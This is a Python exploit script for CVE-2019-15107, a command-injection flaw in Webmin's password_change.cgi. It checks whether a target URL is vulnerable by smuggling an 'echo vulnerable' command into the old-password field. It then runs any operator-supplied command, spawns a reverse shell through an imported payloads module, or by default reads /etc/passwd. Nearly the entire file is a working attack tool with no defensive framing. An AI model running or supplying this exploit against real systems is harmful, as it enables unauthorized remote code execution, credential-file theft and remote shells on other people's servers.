#!/usr/bin/python3
# Imports:
import sys
import payloads
import requests
from urllib.parse import quote_plus

"""
Service: Webmin
Version: <=1.920
Vulnerability Type: RCE via Command Injection
Vulnerable Component: password_change.cgi
CVE: https://www.cvedetails.com/cve/CVE-2019-15107/
"""

# Checking Functions
def check_15107(url):
    isVulnerable = False
    # Query the /password_change.cgi file to see if it's enabled on the webserver
    try:
        file_check_response = requests.get(f"{url}/password_change.cgi",
                                           headers={"Referer":f"{url}/session_login.cgi", "Content-type":"application/x-www-form-urlencoded"},
                                           cookies={"Cookie":"redirect=1; testing=1; sid=x; sessiontest=1"}, verify=False)
        if file_check_response.status_code == 200 and "Password changing is not enabled!" not in file_check_response.text:
            print(f"\033[1;32m[{url}]\033[1;m password_change.cgi exists")
            # If there is a password_change.cgi file, the next step is determining if the file is actually vulnerable to
            # command injection. To do this, we attempt to inject the command `echo vulnerable` in the request. If the
            # injection is successful, the response should contain 'vulnerable'
            RCE_check_rsp = requests.post(f"{url}/password_change.cgi",
                                          headers={"Referer":f"{url}/session_login.cgi", "Content-type":"application/x-www-form-urlencoded"},
                                          cookies={"Cookie":"redirect=1; testing=1; sid=x; sessiontest=1"},
                                          data={"data":"user=root&pam=&expired=2&old=AkkuS%7cecho%20vulnerable%20&new1=akkuss&new2=akkuss"}, verify=False)
            if RCE_check_rsp.status_code == 200 and "vulnerable" in RCE_check_rsp.text:
                isVulnerable = True
    except Exception as e:
        print(f"\033[1;31m[-]\033[1;m {e}")

    return isVulnerable
# exploit
def exploit(url, command):
    try:
        exploit_rsp = requests.post(f"{url}/password_change.cgi",
                                      headers={"Referer": f"{url}/session_login.cgi", "Content-type": "application/x-www-form-urlencoded"},
                                      cookies={"Cookie": "redirect=1; testing=1; sid=x; sessiontest=1"},
                                      data={"data":f"user=root&pam=&expired=2&old=AkkuS%7c{command}%20&new1=akkuss&new2=akkuss"}, verify=False)
        print(exploit_rsp.text)
    except Exception as e:
        print(f"\033[1;31m[-]\033[1;m {e}")
# Main:
def main(target_url):
    # Format validation:
    if target_url.endswith('/'):
        target_url = target_url[:-1]
    # Checking and Exploiting:
    if check_15107(target_url) is True:
        print(f"\033[1;32m[+]\033[1;m {target_url} is vulnerable to command injection!")
        command = input("Enter the command to execute on target (or rshell for a reverse shell): ")
        if command.lower() == 'rshell':
            command = payloads.rshell()
        elif command == "":
            command = "cat /etc/passwd"
        exploit(target_url, quote_plus(command))
    else:
        print(f"\033[1;31m[-]\033[1;m {target_url} is not vulnerable to CVE-2019-15107")
if __name__ == "__main__":
    try:
        main(sys.argv[1])
    except IndexError:
        print(f"Usage: {sys.argv[0]} <target url>")

